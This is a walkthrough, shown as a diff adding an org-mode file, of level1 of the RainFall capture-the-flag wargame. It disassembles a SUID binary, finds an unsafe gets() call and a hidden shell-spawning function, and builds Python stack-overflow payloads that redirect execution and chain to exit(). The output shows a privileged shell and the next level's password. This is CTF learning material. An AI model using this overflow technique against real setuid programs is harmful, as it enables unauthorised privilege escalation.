@@ -1,0 +1,161 @@
+#+title: Walkthrough
+* Data Gathering
+#+begin_src shell :tangle no
+level1@RainFall:~$ readelf -p .rodata ./level1
+String dump of section '.rodata':
+  [     8]  Good... Wait what?^J
+  [    1c]  /bin/sh
+#+end_src
+
+* Binary Analisis
+#+begin_src shell :tangle no
+     gdb -batch -ex 'file level1' -ex 'set disassembly-flavor intel' -ex 'disassemble main'
+    Dump of assembler code for function main:
+       0x08048480 <+0>:	push   ebp
+       0x08048481 <+1>:	mov    ebp,esp
+       0x08048483 <+3>:	and    esp,0xfffffff0
+       0x08048486 <+6>:	sub    esp,0x50
+       0x08048489 <+9>:	lea    eax,[esp+0x10]
+       0x0804848d <+13>:	mov    DWORD PTR [esp],eax
+       0x08048490 <+16>:	call   0x8048340 <gets@plt> -> gets -> read for stdin unsecure.
+       0x08048495 <+21>:	leave  
+       0x08048496 <+22>:	ret    
+    End of assembler dump.
+#+end_src
+** Search  for symbols
+#+begin_src shell :tangle no
+   readelf -s level1
+  Symbol table '.dynsym' contains 8 entries:
+     Num:    Value  Size Type    Bind   Vis      Ndx Name
+       1: 00000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.0 (2) -> gets@plt assembly
+       3: 00000000     0 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.0 (2) -> call to system maybe is interesting
+
+  Symbol table '.symtab' contains 69 entries:
+     Num:    Value  Size Type    Bind   Vis      Ndx Name
+      40: 00000000     0 FILE    LOCAL  DEFAULT  ABS level1.c -> below are functions defined in the file
+      50: 08048444    60 FUNC    GLOBAL DEFAULT   13 run -> a function inside maybe interesting
+#+end_src
+** Binary analisys
+#+begin_src shell :tangle no
+gdb -batch -ex 'file level1' -ex 'set disassembly-flavor intel' -ex 'disassemble run'
+   0x08048444 <+0>:	push   ebp
+   0x08048445 <+1>:	mov    ebp,esp
+   0x08048447 <+3>:	sub    esp,0x18
+   0x0804844a <+6>:	mov    eax,ds:0x80497c0 -> probably the first string  [     8]  Good... Wait what?^J
+   0x0804844f <+11>:	mov    edx,eax
+   0x08048451 <+13>:	mov    eax,0x8048570
+   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
+   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
+   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
+   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
+   0x0804846d <+41>:	call   0x8048350 <fwrite@plt> -> fwrite
+   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584 -> probably the second string [    1c]  /bin/sh
+   0x08048479 <+53>:	call   0x8048360 <system@plt> -> system the one is interesting
+   0x0804847e <+58>:	leave  
+   0x0804847f <+59>:	ret   
+#+end_src
+
+[[source]]
+** Test  that work properly.
+#+begin_src shell :tangle no
+level1@RainFall:~$ gdb ./level1
+..
+(gdb) b main
+Breakpoint 1 at 0x8048483
+(gdb) r
+Starting program: /home/user/level1/level1 
+
+Breakpoint 1, 0x08048483 in main ()
+(gdb) bt # -> searching  for maybe a _start function to have an if or something to run run
+#0  0x08048483 in main ()
+(gdb) jump run # jump to run function
+Continuing at 0x804844a.
+Good... Wait what? # Then i got a shell
+$ whoami 
+level1
+#+end_src
+ # cause gdb is who launched the process ->
+#####
+# This is a security measure to prevent abuse of SUID binaries via debugging tools.  
+Specifically, the kernel checks if the process is being traced (e.g., by gdb). If so, it drops the SUID elevation  to the real UID of the user. This means the program will run with your original permissions, not the owner's
+# https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
+* Explotation
+** What To
+Use the buffer on the main for change the return and execute run function.
+** How To:
+*** Detect the offset to reach  the return.
+# https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+#+begin_src shell :tangle no
+
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x63413563 in ?? () # offset 76
+#+end_src
+*** Detect the va  off  run.
+#+begin_src shell :tangle no
+    (gdb) jump run # jump to run function
+    Continuing at 0x804844a. # run va
+    python  -c  'print("A"*76 + "\x44\x84\x04\x08")' > /tmp/lvl1
+  level1@RainFall:~$ cat  /tmp/level1  | ./level1
+  ^G^CSegmentation fault (core dumped)
+# For what i see i enter system but i close stdin and system  end  and  stack  corruption segfault.
+  #+end_src
+
+**** Fix still write in stdin  
+#+begin_src shell :tangle no
+level1@RainFall:~$cat --help
+Usage: cat [OPTION]... [FILE]...
+  -b, --number-nonblank    number nonempty output lines, overrides -n
+  -e                       equivalent to -vE
+  -E, --show-ends          display $ at end of each line
+  -n, --number             number all output lines
+  -s, --squeeze-blank      suppress repeated empty output lines
+  -t                       equivalent to -vT
+  -T, --show-tabs          display TAB characters as ^I
+  -u                       (ignored)
+  -v, --show-nonprinting   use ^ and M- notation, except for LFD and TAB
+      --help     display this help and exit
+      --version  output version information and exit
+
+With no FILE, or when FILE is -, read standard input.
+
+Examples:
+  cat f - g  Output f's contents, then standard input, then g's contents. # Interesting we could pass the payload and then read stdin. ;)
+#+end_src
+
+  #+begin_src
+  Good... Wait what?
+  level1@RainFall:~$ cat  /tmp/level1  | ./level1
+  id
+  uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
+  cat /home/user/level2/.pass
+  53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+  ^G^CSegmentation fault (core dumped)
+#+end_src
+*** Clean exploit
+**** For that i need the address of  exit  and in that way i will go to exit when return of run function and exit.
+#+begin_src shell
+    p exit
+  $1 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+
+  python -c 'print("A"*76 + "\x44\x84\x04\x08" + "\xe0\xeb\xe5\xb7")' > /tmp/level1 
+  level1@RainFall:~$ cat /tmp/level1 - | ./level1
+  Good... Wait what?
+  id
+  uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
+  cat  /home/user/level2/.pass
+  53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+  level1@RainFall:~$ echo $?
+  12
+#+end_src
+***** We want  to exit with X status.
+append the status code u want  to pass to exit in this case _X = 0_.
+#+begin_src shell
+python -c 'print("A"*76 + "\x44\x84\x04\x08" + "\xe0\xeb\xe5\xb7" +  "\x00"*4)' > /tmp/level1 
+level1@RainFall:~$ cat /tmp/level1 - | ./level1
+Good... Wait what?
+level1@RainFall:~$ echo $?
+0
+#+end_src
+level2_pass=53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
